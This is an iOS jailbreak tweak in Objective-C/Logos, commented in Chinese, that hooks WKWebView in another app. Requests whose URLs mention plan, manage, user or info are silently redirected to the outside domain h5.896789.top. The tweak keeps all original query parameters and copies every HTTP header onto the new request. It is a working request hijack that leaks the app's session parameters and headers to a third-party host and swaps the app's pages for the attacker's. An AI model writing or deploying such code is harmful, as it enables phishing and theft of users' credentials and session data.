#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>

%config(generator=internal)

// ==============================================
// 核心：拦截原APP的网页请求，保留所有参数，只替换域名
// ==============================================
%hook WKWebView
- (void)loadRequest:(NSURLRequest *)request {
    NSURL *originalURL = request.URL;
    NSString *urlString = originalURL.absoluteString;
    if (!urlString.length) {
        %orig;
        return;
    }
    NSString *lowerURL = urlString.lowercaseString;
    if ([lowerURL containsString:@"h5.896789.top"]) {
        %orig;
        return;
    }

    static char kPMHDidRewriteKey;
    NSNumber *didRewrite = objc_getAssociatedObject(self, &kPMHDidRewriteKey);
    if (didRewrite.boolValue) {
        %orig;
        return;
    }
    
    // 只要是 Plan Manage 相关的请求，就替换成你的链接，但保留参数
    if ([lowerURL containsString:@"plan"] || [lowerURL containsString:@"manage"] ||
        [lowerURL containsString:@"user"] || [lowerURL containsString:@"info"]) {
        
        // 拆分参数
        NSArray *parts = [urlString componentsSeparatedByString:@"?"];
        NSString *newURLString = @"https://h5.896789.top/#/entryCenter?";
        
        // 保留原有的所有参数！！！
        if (parts.count > 1) {
            newURLString = [newURLString stringByAppendingString:parts[1]];
        }
        
        NSURL *newURL = [NSURL URLWithString:newURLString];
        if (!newURL) {
            %orig;
            return;
        }
        NSMutableURLRequest *newRequest = [NSMutableURLRequest requestWithURL:newURL];
        newRequest.allHTTPHeaderFields = request.allHTTPHeaderFields;
        objc_setAssociatedObject(self, &kPMHDidRewriteKey, @YES, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
        
        // 加载你的链接 + 原参数
        %orig(newRequest);
        return;
    }
    
    // 其他请求正常放行
    %orig;
}
%end

// ==============================================
// 不拦截点击！让APP自己生成参数！
// 只替换最终打开的网址！
// ==============================================